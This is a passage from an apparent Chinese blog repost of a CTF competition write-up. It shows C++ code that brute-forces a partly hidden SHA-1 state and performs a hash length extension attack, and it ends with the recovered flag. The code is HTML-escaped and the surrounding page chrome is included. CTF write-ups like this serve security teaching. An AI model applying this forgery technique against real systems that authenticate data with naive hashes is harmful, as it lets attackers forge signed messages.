     *    &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x6CD5</span>;&amp;<span class="symbol">#x6240</span>;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#x4E4B</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x5B66</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x53CA</span>;&amp;<span class="symbol">#x5176</span>;&amp;<span class="symbol">#x8FED</span>;&amp;<span class="symbol">#x4EE3</span>;&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x6CD5</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>; 
     */
      for(t = <span class="number">0</span>; t &amp;lt; <span class="number">20</span>; t++)
      {
                   temp   =  <span class="class">SHA1CircularShift</span>(<span class="number">5</span>,<span class="class">A</span>) +
                            ((<span class="class">B</span>   &amp;amp; <span class="class">C</span>) | ((~<span class="class">B</span>) &amp;amp; <span class="class">D</span>)) + <span class="class">E</span> + <span class="class">W</span>[t] + <span class="class">K</span>[<span class="number">0</span>];
                   <span class="class">E</span>   = <span class="class">D</span>;
                   <span class="class">D</span>   = <span class="class">C</span>;
                   <span class="class">C</span>   = <span class="class">SHA1CircularShift</span>(<span class="number">30</span>,<span class="class">B</span>);
                   <span class="class">B</span>   = <span class="class">A</span>;
                   <span class="class">A</span>   = temp;
      }

      for(t = <span class="number">20</span>; t &amp;lt; <span class="number">40</span>; t++)
      {
        temp = <span class="class">SHA1CircularShift</span>(<span class="number">5</span>,<span class="class">A</span>) + (<span class="class">B</span> ^   <span class="class">C</span> ^ <span class="class">D</span>) + <span class="class">E</span> + <span class="class">W</span>[t] + <span class="class">K</span>[<span class="number">1</span>];
        <span class="class">E</span> = <span class="class">D</span>;
        <span class="class">D</span> = <span class="class">C</span>;
        <span class="class">C</span> = <span class="class">SHA1CircularShift</span>(<span class="number">30</span>,<span class="class">B</span>);
        <span class="class">B</span> = <span class="class">A</span>;
        <span class="class">A</span> = temp;
      }

      for(t = <span class="number">40</span>; t &amp;lt; <span class="number">60</span>; t++)
      {
        temp = <span class="class">SHA1CircularShift</span>(<span class="number">5</span>,<span class="class">A</span>) +
               ((<span class="class">B</span> &amp;amp; <span class="class">C</span>) | (<span class="class">B</span> &amp;amp; <span class="class">D</span>) |   (<span class="class">C</span> &amp;amp; <span class="class">D</span>)) + <span class="class">E</span> + <span class="class">W</span>[t] + <span class="class">K</span>[<span class="number">2</span>];
        <span class="class">E</span> = <span class="class">D</span>;
        <span class="class">D</span> = <span class="class">C</span>;
        <span class="class">C</span> = <span class="class">SHA1CircularShift</span>(<span class="number">30</span>,<span class="class">B</span>);
        <span class="class">B</span> = <span class="class">A</span>;
        <span class="class">A</span> = temp;
      }

      for(t = <span class="number">60</span>; t &amp;lt; <span class="number">80</span>; t++)
      {
        temp = <span class="class">SHA1CircularShift</span>(<span class="number">5</span>,<span class="class">A</span>) + (<span class="class">B</span> ^   <span class="class">C</span> ^ <span class="class">D</span>) + <span class="class">E</span> + <span class="class">W</span>[t] + <span class="class">K</span>[<span class="number">3</span>];
        <span class="class">E</span> = <span class="class">D</span>;
        <span class="class">D</span> = <span class="class">C</span>;
        <span class="class">C</span> = <span class="class">SHA1CircularShift</span>(<span class="number">30</span>,<span class="class">B</span>);
        <span class="class">B</span> = <span class="class">A</span>;
        <span class="class">A</span> = temp;
      }
      /* 
     *    &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x8FED</span>;&amp;<span class="symbol">#x4EE3</span>;&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x6CD5</span>;&amp;<span class="symbol">#x7B2C</span>;<span class="number">80</span>&amp;<span class="symbol">#x6B65</span>;&amp;<span class="symbol">#xFF08</span>;&amp;<span class="symbol">#x6700</span>;&amp;<span class="symbol">#x540E</span>;&amp;<span class="symbol">#x4E00</span>;&amp;<span class="symbol">#x6B65</span>;&amp;<span class="symbol">#xFF09</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;
     */
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">0</span>] += <span class="class">A</span>;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">1</span>] += <span class="class">B</span>;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">2</span>] += <span class="class">C</span>;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">3</span>] += <span class="class">D</span>;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">4</span>] += <span class="class">E</span>;

      context-&amp;gt;<span class="class">Message_Block_Index</span> = <span class="number">0</span>;
}


/*
 *    <span class="class">SHA1PadMessage</span>
 *  &amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x6A21</span>;&amp;<span class="symbol">#x5757</span>;
 */

void   <span class="class">SHA_1</span>::<span class="class">SHA1PadMessage</span>(<span class="class">SHA1Context</span> *context)
{

      if (context-&amp;gt;<span class="class">Message_Block_Index</span> &amp;gt; <span class="number">55</span>)
      {
          context-&amp;gt;<span class="class">Message_Block</span>[context-&amp;gt;<span class="class">Message_Block_Index</span>++] = <span class="number">0x80</span>;
        while(context-&amp;gt;<span class="class">Message_Block_Index</span>   &amp;lt; <span class="number">64</span>)
        {
              context-&amp;gt;<span class="class">Message_Block</span>[context-&amp;gt;<span class="class">Message_Block_Index</span>++] = <span class="number">0</span>;
          }

        <span class="class">SHA1ProcessMessageBlock</span>(context);

        while(context-&amp;gt;<span class="class">Message_Block_Index</span>   &amp;lt; <span class="number">56</span>)
        {
              context-&amp;gt;<span class="class">Message_Block</span>[context-&amp;gt;<span class="class">Message_Block_Index</span>++] = <span class="number">0</span>;
        }
      }
      else
      {
          context-&amp;gt;<span class="class">Message_Block</span>[context-&amp;gt;<span class="class">Message_Block_Index</span>++] = <span class="number">0x80</span>;
        while(context-&amp;gt;<span class="class">Message_Block_Index</span>   &amp;lt; <span class="number">56</span>)
        {
              context-&amp;gt;<span class="class">Message_Block</span>[context-&amp;gt;<span class="class">Message_Block_Index</span>++] = <span class="number">0</span>;
        }
      }

      /*
     *    &amp;<span class="symbol">#x628A</span>;&amp;<span class="symbol">#x6700</span>;&amp;<span class="symbol">#x540E</span>;<span class="number">64</span>&amp;<span class="symbol">#x4F4D</span>;&amp;<span class="symbol">#x4FDD</span>;&amp;<span class="symbol">#x5B58</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;
     */
         if(isattack)
                   context-&amp;gt;<span class="class">Length_Low</span>   = paddinglength*<span class="number">8</span>;

      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">56</span>] = context-&amp;gt;<span class="class">Length_High</span> &amp;gt;&amp;gt; <span class="number">24</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">57</span>] = context-&amp;gt;<span class="class">Length_High</span> &amp;gt;&amp;gt; <span class="number">16</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">58</span>] = context-&amp;gt;<span class="class">Length_High</span> &amp;gt;&amp;gt; <span class="number">8</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">59</span>] = context-&amp;gt;<span class="class">Length_High</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">60</span>] = context-&amp;gt;<span class="class">Length_Low</span> &amp;gt;&amp;gt; <span class="number">24</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">61</span>] = context-&amp;gt;<span class="class">Length_Low</span> &amp;gt;&amp;gt; <span class="number">16</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">62</span>] = context-&amp;gt;<span class="class">Length_Low</span> &amp;gt;&amp;gt; <span class="number">8</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">63</span>] = context-&amp;gt;<span class="class">Length_Low</span>;

      <span class="class">SHA1ProcessMessageBlock</span>(context);
}

/*
 *    <span class="class">SHA1Reset</span>
 * 
 *  &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x521D</span>;&amp;<span class="symbol">#x59CB</span>;&amp;<span class="symbol">#x5316</span>;&amp;<span class="symbol">#x4E4B</span>;&amp;<span class="symbol">#x64CD</span>;&amp;<span class="symbol">#x4F5C</span>;
 *    <span class="class">Parameters</span>:&amp;<span class="symbol">#xFF08</span>;&amp;<span class="symbol">#x53C2</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x8BBE</span>;&amp;<span class="symbol">#x7F6E</span>;&amp;<span class="symbol">#xFF09</span>;
 *    <span class="method">context:</span> [in/out]
 *  <span class="class">The</span>   context to reset.
 *
 */
int <span class="class">SHA_1</span>::<span class="class">SHA1Reset</span>(<span class="class">SHA1Context</span>   *context, unsigned long h1, unsigned long h2, unsigned long h3,unsigned long   h4,unsigned long h5)
{
      if (!context)
      {
        return shaNull;
      }

      context-&amp;gt;<span class="class">Length_Low</span>               = <span class="number">0</span>;
      context-&amp;gt;<span class="class">Length_High</span>              = <span class="number">0</span>;
      context-&amp;gt;<span class="class">Message_Block_Index</span>      = <span class="number">0</span>;

      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">0</span>]     = h1;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">1</span>]     = h2;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">2</span>]     = h3;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">3</span>]     = h4;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">4</span>]     = h5;

      context-&amp;gt;<span class="class">Computed</span>   = <span class="number">0</span>;
      context-&amp;gt;<span class="class">Corrupted</span>  = <span class="number">0</span>;
      return shaSuccess;
}

/*
 *    <span class="class">SHA1Result</span>
 *
 *  &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;sha-<span class="number">1</span>&amp;<span class="symbol">#x7ED3</span>;&amp;<span class="symbol">#x679C</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;&amp;<span class="symbol">#xFF1A</span>;
 *:
 *  &amp;<span class="symbol">#x8BE5</span>;&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x6CD5</span>;&amp;<span class="symbol">#x5C06</span>;&amp;<span class="symbol">#x4F1A</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;&amp;<span class="symbol">#x4E00</span>;&amp;<span class="symbol">#x4E2A</span>;<span class="number">160</span>&amp;<span class="symbol">#x6BD4</span>;&amp;<span class="symbol">#x7279</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6458</span>;&amp;<span class="symbol">#x8981</span>;&amp;<span class="symbol">#x961F</span>;&amp;<span class="symbol">#x5217</span>;
 *
 *  &amp;<span class="symbol">#x6216</span>;&amp;<span class="symbol">#x8005</span>;&amp;<span class="symbol">#x8F93</span>;&amp;<span class="symbol">#x51FA</span>;&amp;<span class="symbol">#x8BA1</span>;&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x9519</span>;&amp;<span class="symbol">#x8BEF</span>;
 *
 */
int <span class="class">SHA_1</span>::<span class="class">SHA1Result</span>( <span class="class">SHA1Context</span>   *context,
                unsigned char   <span class="class">Message_Digest</span>[<span class="class">SHA1HashSize</span>])
{
      int i;

      if (!context || !<span class="class">Message_Digest</span>)
      {
        return shaNull;
      }

      if (context-&amp;gt;<span class="class">Corrupted</span>)
      {
        return context-&amp;gt;<span class="class">Corrupted</span>;
      }

      if (!context-&amp;gt;<span class="class">Computed</span>)
      {
        <span class="class">SHA1PadMessage</span>(context);
        for(i=<span class="number">0</span>; i&amp;lt;<span class="number">64</span>; ++i)
        {
            /* &amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6E05</span>;&amp;<span class="symbol">#x96F6</span>; */
            context-&amp;gt;<span class="class">Message_Block</span>[i] = <span class="number">0</span>;
          }
        context-&amp;gt;<span class="class">Length_Low</span> = <span class="number">0</span>;    /* &amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;&amp;<span class="symbol">#x6E05</span>;&amp;<span class="symbol">#x96F6</span>; */
        context-&amp;gt;<span class="class">Length_High</span> = <span class="number">0</span>;
        context-&amp;gt;<span class="class">Computed</span> = <span class="number">1</span>;
      }

      for(i = <span class="number">0</span>; i &amp;lt; <span class="class">SHA1HashSize</span>; ++i)
      {
        <span class="class">Message_Digest</span>[i] =   context-&amp;gt;<span class="class">Intermediate_Hash</span>[i&amp;gt;&amp;gt;<span class="number">2</span>]
                            &amp;gt;&amp;gt; <span class="number">8</span> * ( <span class="number">3</span> - ( i &amp;amp; <span class="number">0x03</span> ) );
      }

      return shaSuccess;
}

/*
 *  &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;sha-<span class="number">1</span>&amp;<span class="symbol">#x8F93</span>;&amp;<span class="symbol">#x5165</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;&amp;<span class="symbol">#xFF1A</span>;
 *
 *  &amp;<span class="symbol">#x63A5</span>;&amp;<span class="symbol">#x6536</span>;&amp;<span class="symbol">#x5355</span>;&amp;<span class="symbol">#x4F4D</span>;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;&amp;<span class="symbol">#x4E3A</span>;<span class="number">8</span>&amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x8282</span>;&amp;<span class="symbol">#x500D</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;
 *
 */
int <span class="class">SHA_1</span>::<span class="class">SHA1Input</span>(    <span class="class">SHA1Context</span>    *context,
                  const unsigned char  *message_array,
                  unsigned       length)
{
      if(isattack)
                   return   shaSuccess;

         if   (!length)
      {
        return shaSuccess;
      }

      if (!context || !message_array)
      {
        return shaNull;
      }

      if (context-&amp;gt;<span class="class">Computed</span>)
      {
        context-&amp;gt;<span class="class">Corrupted</span> =   shaStateError;
          return shaStateError;
      }

      if (context-&amp;gt;<span class="class">Corrupted</span>)
      {
         return context-&amp;gt;<span class="class">Corrupted</span>;
      }
      while(length-- &amp;amp;&amp;amp; !context-&amp;gt;<span class="class">Corrupted</span>)
      {
      context-&amp;gt;<span class="class">Message_Block</span>[context-&amp;gt;<span class="class">Message_Block_Index</span>++] =
                    (*message_array &amp;amp;   <span class="number">0xFF</span>);

      context-&amp;gt;<span class="class">Length_Low</span> += <span class="number">8</span>;
      if (context-&amp;gt;<span class="class">Length_Low</span> == <span class="number">0</span>)
      {
        context-&amp;gt;<span class="class">Length_High</span>++;
        if (context-&amp;gt;<span class="class">Length_High</span> == <span class="number">0</span>)
        {
            /* <span class="class">Message</span> is too long */
            context-&amp;gt;<span class="class">Corrupted</span> = <span class="number">1</span>;
        }
      }

      if (context-&amp;gt;<span class="class">Message_Block_Index</span> == <span class="number">64</span>)
      {
        <span class="class">SHA1ProcessMessageBlock</span>(context);
      }

      message_array++;
      }

      return shaSuccess;
}

int main(int argc, char* argv[])
{
         class   <span class="class">SHA_1</span> sha1;
         <span class="class">SHA_1</span>::<span class="class">SHA1Context</span>   sh1context;
//      sha1.<span class="class">SHA1Reset</span>(&amp;amp;sh1context,<span class="number">0x67452301</span>,<span class="number">0xEFCDAB89</span>,<span class="number">0x98BADCFE</span>,<span class="number">0x10325476</span>,<span class="number">0xC3D2E1F0</span>);

         paddinglength   = <span class="number">128</span>;
         isattack   = <span class="class">TRUE</span>;

         char   c[]={&amp;apos;<span class="number">0</span>&amp;apos;,&amp;apos;<span class="number">1</span>&amp;apos;,&amp;apos;<span class="number">2</span>&amp;apos;,&amp;apos;<span class="number">3</span>&amp;apos;,&amp;apos;<span class="number">4</span>&amp;apos;,&amp;apos;<span class="number">5</span>&amp;apos;,&amp;apos;<span class="number">6</span>&amp;apos;,&amp;apos;<span class="number">7</span>&amp;apos;,&amp;apos;<span class="number">8</span>&amp;apos;,&amp;apos;<span class="number">9</span>&amp;apos;,&amp;apos;a&amp;apos;,&amp;apos;b&amp;apos;,&amp;apos;c&amp;apos;,&amp;apos;d&amp;apos;,&amp;apos;e&amp;apos;,&amp;apos;f&amp;apos;};
         int   b[<span class="number">7</span>],b1[<span class="number">7</span>];
         int   bc=<span class="number">0</span>,bc1=<span class="number">0</span>;
         for(int   i=<span class="number">0</span>;i&amp;lt;strlen(argv[<span class="number">1</span>]);i++)
         {
                   if(argv[<span class="number">1</span>][i]   == &amp;apos;x&amp;apos;)
                   {
                            b[bc]   = i;
                            bc++;
                   }
         }

         for(i=<span class="number">0</span>;i&amp;lt;strlen(argv[<span class="number">2</span>]);i++)
         {
                   if(argv[<span class="number">2</span>][i]   == &amp;apos;x&amp;apos;)
                   {
                            b1[bc1]   = i;
                            bc1++;
                   }
         }

         int   i1 = atoi(argv[<span class="number">3</span>]);
//      for(int   i1=<span class="number">7</span>;i1&amp;lt;<span class="number">16</span>;i1++)
         {
                   argv[<span class="number">1</span>][b[<span class="number">0</span>]]   = c[i1];
                   for(int   i2=<span class="number">0</span>;i2&amp;lt;<span class="number">16</span>;i2++)
                   {
                            argv[<span class="number">1</span>][b[<span class="number">1</span>]]   = c[i2];
                            for(int   i3=<span class="number">0</span>;i3&amp;lt;<span class="number">16</span>;i3++)
                            {
                                     printf(&amp;quot;%d   %d %d\n&amp;quot;,i1,i2,i3);
                                     argv[<span class="number">1</span>][b[<span class="number">2</span>]]   = c[i3];
                                     for(int   i4=<span class="number">0</span>;i4&amp;lt;<span class="number">16</span>;i4++)
                                     {
                                               argv[<span class="number">1</span>][b[<span class="number">3</span>]]   = c[i4];
                                               for(int   i5=<span class="number">0</span>;i5&amp;lt;<span class="number">16</span>;i5++)
                                               {
                                                        argv[<span class="number">1</span>][b[<span class="number">4</span>]]   = c[i5];
                                                        for(int   i6=<span class="number">0</span>;i6&amp;lt;<span class="number">16</span>;i6++)
                                                        {
                                                                 argv[<span class="number">1</span>][b[<span class="number">5</span>]]   = c[i6];
                                                                 for(int   i7=<span class="number">0</span>;i7&amp;lt;<span class="number">16</span>;i7++)
                                                                 {
                                                                           argv[<span class="number">1</span>][b[<span class="number">6</span>]]   = c[i7];

                                                                           char   sss[<span class="number">100</span>];
                                                                           char   *tostr;
                                                                           memset(sss,<span class="number">0</span>,sizeof(sss));
                                                                           strcpy(sss,&amp;quot;<span class="number">0</span>x&amp;quot;);
                                                                          memcpy(&amp;amp;sss[<span class="number">2</span>],&amp;amp;argv[<span class="number">1</span>][<span class="number">0</span>],<span class="number">8</span>);
                                                                           unsigned   long h1 = strtoul(sss,&amp;amp;tostr,<span class="number">16</span>);
                                                                           memcpy(&amp;amp;sss[<span class="number">2</span>],&amp;amp;argv[<span class="number">1</span>][<span class="number">8</span>],<span class="number">8</span>);
                                                                           unsigned   long h2 = strtoul(sss,&amp;amp;tostr,<span class="number">16</span>);
                                                                           memcpy(&amp;amp;sss[<span class="number">2</span>],&amp;amp;argv[<span class="number">1</span>][<span class="number">16</span>],<span class="number">8</span>);
                                                                           unsigned   long h3 = strtoul(sss,&amp;amp;tostr,<span class="number">16</span>);
                                                                           memcpy(&amp;amp;sss[<span class="number">2</span>],&amp;amp;argv[<span class="number">1</span>][<span class="number">24</span>],<span class="number">8</span>);
                                                                           unsigned   long h4 = strtoul(sss,&amp;amp;tostr,<span class="number">16</span>);
                                                                           memcpy(&amp;amp;sss[<span class="number">2</span>],&amp;amp;argv[<span class="number">1</span>][<span class="number">32</span>],<span class="number">8</span>);
                                                                           unsigned   long h5 = strtoul(sss,&amp;amp;tostr,<span class="number">16</span>);

                                                                           sha1.<span class="class">SHA1Reset</span>(&amp;amp;sh1context,h1,h2,h3,h4,h5);
                                                                          sha1.<span class="class">SHA1Input</span>(&amp;amp;sh1context,(<span class="class">BYTE</span>*)&amp;quot;attack&amp;quot;,<span class="number">128</span>);
                                                                           <span class="class">BYTE</span>   hashresult[<span class="number">20</span>];
                                                                           sha1.<span class="class">SHA1Result</span>(&amp;amp;sh1context,hashresult);
                                                                           char   stemp[<span class="number">10</span>];
                                                                           char   output[<span class="number">100</span>];
                                                                           output[<span class="number">0</span>]   = <span class="number">0</span>;
                                                                           for(int   i=<span class="number">0</span>;i&amp;lt;<span class="number">20</span>;i++)
                                                                           {
                                                                                    sprintf(stemp,&amp;quot;%<span class="number">02</span>x&amp;quot;,hashresult[i]);
                                                                                    strcat(output,stemp);
                                                                           }
                                                                           for(i=<span class="number">0</span>;i&amp;lt;<span class="number">7</span>;i++)
                                                                                    output[b1[i]]  = &amp;apos;x&amp;apos;;
                                                                           if(strcmp(argv[<span class="number">2</span>],output)   == <span class="number">0</span>)
                                                                           {
                                                                                    printf(&amp;quot;find!   \n%s\n&amp;quot;,argv[<span class="number">1</span>]);
                                                                                    return   <span class="number">0</span>;
                                                                           }
                                                                 }
                                                        }
                                               }
                                     }
                            }
                   }
         }


         return   <span class="number">0</span>;
}
</code></pre><h4 id="&#x6700;&#x540E;&#x83B7;&#x53D6;&#x7684;flag&#x4E3A;Congratulations,_flag_is_flag{ha5h_ex7ens1on_r0cks!}">&#x6700;&#x540E;&#x83B7;&#x53D6;&#x7684;flag&#x4E3A;Congratulations, flag is flag{ha5h_ex7ens1on_r0cks!}</h4><h4 id="*&#x4F5C;&#x8005;&#xFF1A;&#x58A8;&#x5BA2;&#xFF0C;&#x672C;&#x6587;&#x5C5E;FreeBuf&#x539F;&#x521B;&#x5956;&#x52B1;&#x8BA1;&#x5212;&#xFF0C;&#x672A;&#x7ECF;&#x8BB8;&#x53EF;&#x7981;&#x6B62;&#x8F6C;&#x8F7D;">*&#x4F5C;&#x8005;&#xFF1A;&#x58A8;&#x5BA2;&#xFF0C;&#x672C;&#x6587;&#x5C5E;FreeBuf&#x539F;&#x521B;&#x5956;&#x52B1;&#x8BA1;&#x5212;&#xFF0C;&#x672A;&#x7ECF;&#x8BB8;&#x53EF;&#x7981;&#x6B62;&#x8F6C;&#x8F7D;</h4><p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/3UfaIzA">&#x5224;&#x65AD;&#x6B27;&#x62C9;&#x56DE;&#x8DEF;</a></li>
<li>2.<a href="/articles/qqAFRzM">&#x300A;&#x7B97;&#x6CD5;&#x5BFC;&#x8BBA;&#x300B;&#x8BFB;&#x4E66;&#x7B14;&#x8BB0;&#x4E4B;&#x6392;&#x5E8F;&#x7B97;&#x6CD5;&#x2014;Merge Sort &#x5F52;&#x5E76;&#x6392;&#x5E8F;&#x7B97;&#x6CD5;</a></li>
<li>3.<a href="/articles/BnYNRjI">PAT Gas Station</a></li>
<li>4.<a href="/articles/yY7RF3">USACO 2.2 Party Lamps &#x6D3E;&#x5BF9;&#x706F; (lamps)</a></li>
<li>5.<a href="/articles/vuuUFjY">&#x51E0;&#x79CD;&#x9501;&#x7B97;&#x6CD5;&#x7684;&#x5B9E;&#x73B0;</a></li>
<li><p>6.<a href="/articles/NrMJJz">CUDA —— Dynamic Parallelism</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/BRrEJv">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;BRrEJv&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>
  
	</div>
		<footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/加密解密/">加密解密</a><a href="/tags/网络安全/">网络安全</a>
  </div>

</div>



	<div class="article-share" id="share">
	
	  <div data-url="http://taojinke.github.io/2015/06/07/20150607/f910270/" data-title="“强网杯”网络安全挑战赛WriteUp - | dianzi blog" data-tsina="512316815" class="share clearfix">
	  </div>
	
	</div>


</footer>

   	       
	</article>
	
<nav class="article-nav clearfix">
 
 <div class="prev" >
 <a href="/2015/06/07/20150607/f90bba3/" title=".spring jdbctemplate源码跟踪 -">
  <strong>上一篇：</strong><br/>
  <span>
  .spring jdbctemplate源码跟踪 -</span>
</a>
</div>


<div class="next">
<a href="/2015/06/07/20150607/f8553b7/"  title="cowplot：基于ggplot的可视化系统 -">
 <strong>下一篇：</strong><br/> 
 <span>cowplot：基于ggplot的可视化系统 -
</span>
</a>
</div>

</nav>

	


	<!--���ٰ�-->
	<div id="SOHUCS"></div>
	<script charset="utf-8" type="text/javascript" src="http://assets.changyan.sohu.com/upload/changyan.js" ></script>
	<script type="text/javascript">
		window.changyan.api.config({
			appid: 'cyrNEabSF',
			conf: 'prod_034326b8fb64167667674dc334104436'
		});
	</script>
</div>


      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>

  <div id="toc" class="toc-aside">
  <strong class="toc-title">文章目录</strong>
 
 <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#“强网杯”网络安全挑战赛WriteUp"><span class="toc-number">1.</span> <span class="toc-text">“强网杯”网络安全挑战赛WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Guess"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">Guess</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#溢出点："><span class="toc-number">1.0.0.2.</span> <span class="toc-text">溢出点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用："><span class="toc-number">1.0.0.3.</span> <span class="toc-text">利用：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用脚本："><span class="toc-number">1.0.0.4.</span> <span class="toc-text">利用脚本：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#urldecoder"><span class="toc-number">1.0.0.5.</span> <span class="toc-text">urldecoder</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shellman"><span class="toc-number">1.0.0.6.</span> <span class="toc-text">shellman</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用：-1"><span class="toc-number">1.0.0.7.</span> <span class="toc-text">利用：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#imdb"><span class="toc-number">1.0.0.8.</span> <span class="toc-text">imdb</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞点："><span class="toc-number">1.0.0.9.</span> <span class="toc-text">漏洞点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用：-2"><span class="toc-number">1.0.0.10.</span> <span class="toc-text">利用：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#domain_db"><span class="toc-number">1.0.0.11.</span> <span class="toc-text">domain_db</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞："><span class="toc-number">1.0.0.12.</span> <span class="toc-text">漏洞：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用过程大致如下："><span class="toc-number">1.0.0.13.</span> <span class="toc-text">利用过程大致如下：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#俳句自动打分系统"><span class="toc-number">1.0.0.14.</span> <span class="toc-text">俳句自动打分系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flager-checker"><span class="toc-number">1.0.0.15.</span> <span class="toc-text">Flager-checker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Keygen"><span class="toc-number">1.0.0.16.</span> <span class="toc-text">Keygen</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Broken"><span class="toc-number">1.0.0.17.</span> <span class="toc-text">Broken</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NESTING_DOLL"><span class="toc-number">1.0.0.18.</span> <span class="toc-text">NESTING DOLL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Repartition:"><span class="toc-number">1.0.0.19.</span> <span 